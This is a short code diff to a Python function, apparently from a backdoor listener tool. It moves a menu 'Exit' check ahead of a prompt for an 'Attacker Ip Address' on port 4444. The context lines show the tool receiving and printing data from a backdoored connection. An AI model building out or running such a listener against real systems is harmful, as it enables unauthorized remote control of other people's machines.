@@ -14,7 +14,10 @@ def listen_other_server():
         "[07] Exit\n"
     )   
     door_choose = int(input("=> "))
-    
+
+    if door_choose == 7:
+        exit()
+
     try: #Listen backdoor
         host = input(f"=>{Fore.RED} Attacker Ip Address: ")
         port = 4444
@@ -70,8 +73,7 @@ def listen_other_server():
                 response = cnn.recv(4096).decode()
                 print(f"{response}")
 
-            elif door_choose == 7:
-                exit()
+                
 
     except KeyError as e:
         print("pls use the correct character ->" + str(e))
